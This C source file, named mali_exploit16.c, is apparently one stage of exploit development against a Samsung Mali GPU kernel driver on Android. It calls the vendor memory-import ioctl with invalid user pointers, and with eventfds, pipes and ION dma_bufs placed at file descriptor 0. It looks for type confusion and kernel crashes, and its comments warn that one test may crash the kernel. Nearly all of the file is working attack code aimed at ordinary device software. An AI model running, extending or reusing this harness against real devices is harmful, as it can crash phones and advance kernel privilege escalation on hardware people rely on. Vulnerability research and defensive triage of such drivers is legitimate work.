/*
 * mali_exploit16.c — Empirical vendor import path analysis
 * 
 * Determines EXACTLY how the Mali vendor MEM_IMPORT function handles:
 * 1. phandle as direct fd vs pointer
 * 2. dma_buf f_op validation
 * 3. Different phandle values (0, 4, fd#, 0xBF000001)
 * 
 * Each test runs in a forked child with alarm() for crash safety.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/wait.h>
#include <signal.h>
/* ION ioctl definitions (inline to avoid header dependency) */
struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};
struct ion_fd_data {
    int handle;
    int fd;
};
struct ion_handle_data {
    int handle;
};
#define ION_IOC_ALLOC   _IOWR('I', 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR('I', 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR('I', 4, struct ion_fd_data)

struct uk_header {
    unsigned int id;
    unsigned int ret;
};

struct mali_import {
    struct uk_header header;     /* +0: func id, +4: return */
    unsigned long long phandle;  /* +8: platform handle */
    unsigned int type;           /* +16: import type (2=UMM) */
    unsigned int padding;        /* +20 */
    unsigned long long flags;    /* +24: allocation flags */
    unsigned long long gpu_va;   /* +32: output GPU VA */
    unsigned long long va_pages; /* +40: output page count */
};

/* Mali ioctl helpers — TWO different type codes:
 * Standard (type 'M') for version check etc.
 * Vendor (type 0x80) for Samsung vendor functions */
#include <linux/ioctl.h>
static unsigned make_cmd_std(int sz) {
    return _IOC(_IOC_READ|_IOC_WRITE, 'M', 0, sz);
}
static unsigned make_cmd_vendor(int sz) {
    return _IOC(_IOC_READ|_IOC_WRITE, 0x80, 0, sz);
}

/* Full mali context init — matches working mali_exploit13 pattern */
static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    unsigned char hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10; /* version major=10, minor=0 */
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    /* Function 530 = additional init required for vendor dispatch */
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* do_import using raw byte buffer (matching working pattern) */
static int do_import_raw(int mali_fd, void *phandle_ptr, unsigned int type, 
                         unsigned long long flags,
                         unsigned long long *out_gpu_va, unsigned long long *out_pages) {
    unsigned char buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(unsigned long long*)(buf + 8) = (unsigned long long)(unsigned long)phandle_ptr;
    *(unsigned int*)(buf + 16) = type;
    *(unsigned long long*)(buf + 24) = flags;
    
    int ret = ioctl(mali_fd, make_cmd_vendor(48), buf);
    unsigned int result = ((struct uk_header*)buf)->id;
    unsigned long long gva = *(unsigned long long*)(buf + 32);
    unsigned long long pages = *(unsigned long long*)(buf + 40);
    
    printf("    ioctl=%d errno=%d result=%u gpu_va=0x%llx pages=%llu\n",
           ret, errno, result, gva, pages);
    
    if (out_gpu_va) *out_gpu_va = gva;
    if (out_pages) *out_pages = pages;
    return result;
}

/* Create an ION dma_buf and return the fd */
static int create_dma_buf(void) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    
    struct ion_allocation_data alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.len = 4096;
    alloc.align = 4096;
    alloc.heap_id_mask = 1;  /* system heap */
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        close(ion_fd);
        return -1;
    }
    
    struct ion_fd_data share;
    memset(&share, 0, sizeof(share));
    share.handle = alloc.handle;
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
        close(ion_fd);
        return -1;
    }
    
    /* Free the handle but keep the dma_buf fd */
    struct ion_handle_data hfree;
    hfree.handle = alloc.handle;
    ioctl(ion_fd, ION_IOC_FREE, &hfree);
    close(ion_fd);
    
    return share.fd;
}

typedef struct {
    const char *name;
    int result;
    int signal;
    int exited;
} test_result_t;

static test_result_t run_test(const char *name,
                              void (*setup)(int *fd0_out, int *extra_out),
                              unsigned long long phandle, unsigned int type) {
    test_result_t tr = {.name = name, .result = -1, .signal = 0, .exited = 0};
    printf("\n=== %s ===\n", name);
    printf("    phandle=0x%llx type=%u\n", (unsigned long long)phandle, type);
    
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        
        int mfd = mali_open_ctx();
        if (mfd < 0) { printf("    FAILED to open mali ctx\n"); _exit(99); }
        
        int fd0 = -1, extra = -1;
        if (setup) setup(&fd0, &extra);
        
        /* phandle is a USER POINTER to the fd value */
        int the_fd = (int)phandle;
        int result = do_import_raw(mfd, &the_fd, type, 0xF, NULL, NULL);
        printf("    result=%d\n", result);
        
        if (fd0 >= 0 && fd0 != 0) close(fd0);
        if (extra >= 0) close(extra);
        close(mfd);
        _exit(result);
    }
    
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        tr.signal = WTERMSIG(status);
        printf("    CRASHED: signal %d\n", tr.signal);
    } else {
        tr.exited = 1;
        tr.result = WEXITSTATUS(status);
        printf("    OK: exit %d\n", tr.result);
    }
    return tr;
}

/* Setup functions for different fd=0 configurations */

static void setup_eventfd_at_fd0(int *fd0, int *extra) {
    int efd = eventfd(0, 0);
    dup2(efd, 0);
    if (efd != 0) close(efd);
    *fd0 = 0;
    printf("    fd0 = eventfd (count=0)\n");
}

static void setup_dmabuf_at_fd0(int *fd0, int *extra) {
    int dma_fd = create_dma_buf();
    if (dma_fd < 0) { printf("    FAILED to create dma_buf\n"); return; }
    dup2(dma_fd, 0);
    if (dma_fd != 0) close(dma_fd);
    *fd0 = 0;
    printf("    fd0 = dma_buf (ION 4KB)\n");
}

static void setup_nothing(int *fd0, int *extra) {
    /* Keep stdin as-is (probably /dev/null or tty) */
    printf("    fd0 = stdin (unchanged)\n");
}

static void setup_eventfd_keep(int *fd0, int *extra) {
    int efd = eventfd(0, 0);
    *extra = efd;
    printf("    eventfd at fd=%d (NOT at fd0)\n", efd);
}

static void setup_dmabuf_keep(int *fd0, int *extra) {
    int dma_fd = create_dma_buf();
    *extra = dma_fd;
    printf("    dma_buf at fd=%d (NOT at fd0)\n", dma_fd);
}

static void setup_pipe_at_fd0(int *fd0, int *extra) {
    int pfd[2];
    pipe(pfd);
    dup2(pfd[0], 0);
    close(pfd[0]);
    *extra = pfd[1];
    *fd0 = 0;
    printf("    fd0 = pipe read end\n");
}

int main(void) {
    printf("=== Mali Vendor Import Path Analysis v2 ===\n");
    printf("NOTE: phandle is a USER POINTER to fd value\n\n");
    
    test_result_t results[12];
    int n = 0;
    
    /* Test 1: Normal import — dma_buf fd via valid pointer */
    printf("\n=== T1: Import dma_buf via &fd (should succeed) ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int dma_fd = create_dma_buf();
            printf("    mali=%d dma_buf=%d\n", mfd, dma_fd);
            int result = do_import_raw(mfd, &dma_fd, 2, 0xF, NULL, NULL);
            _exit(result == 0 ? 0 : result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T1: dma_buf via &fd", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Test 2: Import eventfd via valid pointer (should fail — not dma_buf) */
    printf("\n=== T2: Import eventfd via &fd (should fail if f_op check) ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int efd = eventfd(0, 0);
            printf("    mali=%d eventfd=%d\n", mfd, efd);
            int result = do_import_raw(mfd, &efd, 2, 0xF, NULL, NULL);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T2: eventfd via &fd", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Test 3: Import stdin via &fd=0 */
    printf("\n=== T3: Import stdin via &(int)0 ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int fd_val = 0;
            printf("    mali=%d fd_val=%d (stdin)\n", mfd, fd_val);
            int result = do_import_raw(mfd, &fd_val, 2, 0xF, NULL, NULL);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T3: stdin via &0", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }

    /* Test 4: Bad pointer (0xBF000001) with dma_buf at fd=0 */
    printf("\n=== T4: Bad phandle=0xBF000001, fd0=dma_buf ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int dma_fd = create_dma_buf();
            dup2(dma_fd, 0);
            if (dma_fd != 0) close(dma_fd);
            printf("    mali=%d fd0=dma_buf, phandle=0xBF000001\n", mfd);
            /* Pass raw invalid pointer as phandle */
            unsigned char buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(unsigned long long*)(buf + 8) = 0xBF000001ULL;
            *(unsigned int*)(buf + 16) = 2;
            *(unsigned long long*)(buf + 24) = 0xF;
            int r = ioctl(mfd, make_cmd_vendor(48), buf);
            unsigned int result = ((struct uk_header*)buf)->id;
            unsigned long long gva = *(unsigned long long*)(buf + 32);
            printf("    ioctl=%d errno=%d result=%u gpu_va=0x%llx\n", r, errno, result, gva);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T4: bad_ptr fd0=dma_buf", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Test 5: Bad pointer (0xBF000001) with eventfd at fd=0 */
    printf("\n=== T5: Bad phandle=0xBF000001, fd0=eventfd ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int efd = eventfd(0, 0);
            dup2(efd, 0);
            if (efd != 0) close(efd);
            printf("    mali=%d fd0=eventfd, phandle=0xBF000001\n", mfd);
            unsigned char buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(unsigned long long*)(buf + 8) = 0xBF000001ULL;
            *(unsigned int*)(buf + 16) = 2;
            *(unsigned long long*)(buf + 24) = 0xF;
            int r = ioctl(mfd, make_cmd_vendor(48), buf);
            unsigned int result = ((struct uk_header*)buf)->id;
            unsigned long long gva = *(unsigned long long*)(buf + 32);
            printf("    ioctl=%d errno=%d result=%u gpu_va=0x%llx\n", r, errno, result, gva);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T5: bad_ptr fd0=eventfd", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Test 6: Bad pointer (4) with eventfd at fd=0 — original crash trigger */
    printf("\n=== T6: Bad phandle=4, fd0=eventfd (DANGER: may crash kernel) ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int efd = eventfd(0, 0);
            dup2(efd, 0);
            if (efd != 0) close(efd);
            printf("    mali=%d fd0=eventfd, phandle=4\n", mfd);
            unsigned char buf[48];
            memset(buf, 0, 48);
            ((struct uk_header*)buf)->id = 513;
            *(unsigned long long*)(buf + 8) = 4ULL;
            *(unsigned int*)(buf + 16) = 2;
            *(unsigned long long*)(buf + 24) = 0xF;
            int r = ioctl(mfd, make_cmd_vendor(48), buf);
            unsigned int result = ((struct uk_header*)buf)->id;
            unsigned long long gva = *(unsigned long long*)(buf + 32);
            printf("    ioctl=%d errno=%d result=%u gpu_va=0x%llx\n", r, errno, result, gva);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T6: phandle=4 fd0=eventfd", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Test 7: Import pipe via valid &fd */
    printf("\n=== T7: Import pipe via &fd ===\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mfd = mali_open_ctx();
            int pfd[2]; pipe(pfd);
            printf("    mali=%d pipe_read=%d\n", mfd, pfd[0]);
            int result = do_import_raw(mfd, &pfd[0], 2, 0xF, NULL, NULL);
            _exit(result);
        }
        int st; waitpid(pid, &st, 0);
        results[n] = (test_result_t){"T7: pipe via &fd", 0, 0, 0};
        if (WIFSIGNALED(st)) { results[n].signal = WTERMSIG(st); printf("  CRASH sig=%d\n", WTERMSIG(st)); }
        else { results[n].exited = 1; results[n].result = WEXITSTATUS(st); printf("  exit=%d\n", WEXITSTATUS(st)); }
        n++;
    }
    
    /* Summary */
    printf("\n\n========== SUMMARY ==========\n");
    for (int i = 0; i < n; i++) {
        if (results[i].signal)
            printf("  %-40s CRASH (sig=%d)\n", results[i].name, results[i].signal);
        else
            printf("  %-40s result=%d\n", results[i].name, results[i].result);
    }
    
    printf("\n--- ANALYSIS ---\n");
    printf("T1=0 (success) confirms basic import works\n");
    printf("T2: if error: f_op check blocks non-dma_buf. If crash: TYPE CONFUSION!\n");
    printf("T4 vs T5: if T4=success T5=error: bad ptr falls back to fd=0\n");
    printf("T6: if kernel panic: phandle=4 triggers get_user fault crash\n");
    
    return 0;
}

